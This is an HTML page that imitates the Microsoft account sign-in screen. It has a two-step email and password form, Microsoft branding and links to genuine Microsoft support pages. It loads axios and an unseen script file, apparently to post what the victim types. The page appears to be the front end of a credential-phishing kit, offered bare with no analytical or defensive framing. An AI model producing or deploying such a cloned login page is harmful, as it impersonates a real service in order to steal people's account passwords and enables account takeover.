<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, shrink-to-fit=no"
    />
    <title>Sign in to your Microsoft account</title>
    <link
      rel="icon"
      type="image/svg+xml"
      sizes="21x21"
      href="assets/img/favicon16.svg"
    />
    <link
      rel="icon"
      type="image/svg+xml"
      sizes="43x43"
      href="assets/img/favicon32.svg"
    />
    <link
      rel="icon"
      type="image/svg+xml"
      sizes="240x240"
      href="assets/img/favicon%20180.svg"
    />
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
    <link rel="stylesheet" href="assets/css/styles.min.css" />
    <script src="assets/js/axios.min.js"></script>
  </head>

  <body class="text-nowrap" style="width: 100%; height: 100vh">
    <div id="loginForm" class="container">
      <img id="image" src="assets/img/microsoft_logo.svg" />
      <div></div>
      <section id="section-main">
        <section id="section-1" class="slide-page">
          <div style="margin-bottom: 10px"></div>
          <p id="signIn" style="font-size: 20px" class="field">Sign in</p>
          <h5 id="result"></h5>
          <input
            type="email"
            id="email"
            class="field"
            placeholder="Email, phone, or Skype"
          />
          <p id="NoAccount" class="field">
            No account?<a
              id="linkCreateAccount"
              href="https://signup.live.com/?lic=1"
              style="color: #0067b8"
              >Create One!</a
            >
          </p>
          <p id="signInSecurityKey" class="field">
            <a
              href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key"
              style="color: #0067b8"
              >Sign in with a security key</a
            ><i class="far fa-question-circle fa-lg" id="iconQ"></i>
          </p>
          <p id="signInOptions" class="field">
            <a
              href="https://account.microsoft.com/account/manage-my-account"
              style="color: #0067b8"
              >Sign-in options</a
            >
          </p>
          <p id="btnPlace" class="field">
            <button
              class="firstNext next"
              href="#next"
              type="button"
              id="btnSend"
            >
              Next
            </button>
          </p>
        </section>
        <section id="section-2" class="page secondSlide">
          <p style="padding-top: 20px" id="userLine">P</p>
          <button id="btnBack" style="height: 4px; width: 4px">
            <img src="assets/img/back.png" />
          </button>
          <p id="enterPwd" style="font-size: 20px">Enter Password</p>
          <h5 id="passResult"></h5>
          <p><input type="password" id="password" placeholder="Password" /></p>
          <p id="keepMe">Keep me signed in</p>
          <input type="checkbox" id="cbRemember" />
          <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
          <p id="SignWithKey">
            <a href="#">Sign in with Windows Hello or a security key</a>
          </p>
          <p id="btnSignInLocation">
            <button id="btnSignIn" class="submit" type="button">Sign in</button>
          </p>
        </section>
      </section>
    </div>
    <div id="footer" style="height: 36px">
      <div id="terms" style="float: left; width: 84px">
        <p style="font-size: 13px; text-align: left">Terms of use</p>
      </div>
      <div style="float: left; width: 105px">
        <p style="font-size: 12px">Privacy &amp; cookies</p>
      </div>
      <div style="float: left; width: 24px">
        <p style="font-size: 12px">•••<br /></p>
      </div>
    </div>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>
  </body>
</html>
